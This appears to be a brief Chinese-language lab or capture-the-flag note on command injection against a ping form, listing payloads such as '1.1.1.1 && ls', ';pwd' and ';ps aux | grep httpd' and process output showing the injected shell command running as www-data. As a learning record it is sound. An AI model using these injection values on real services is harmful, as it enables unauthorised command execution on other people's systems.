# Command injection

### 觀察
可以先隨便試看看，試著猜想它可能是用麼條件結尾或斷行

```
1.1.1.1 && ls
```
```
1.1.1.1&&ls
```

### 漸進式的測試
猜到 `;`，可以試試看有沒有更簡短或省時間的方式

```
1.1.1.1;ls
```

```
;pwd
```

```
;ps aux | grep httpd
```

```
www-data   645  0.0  0.0   4296   752 ?        S    05:44   0:00 sh -c ping  -c 4 ;ps aux | grep httpd
www-data   648  0.0  0.0  11120   992 ?        S    05:44   0:00 grep httpd
```

## Done

web service user is `www-data`
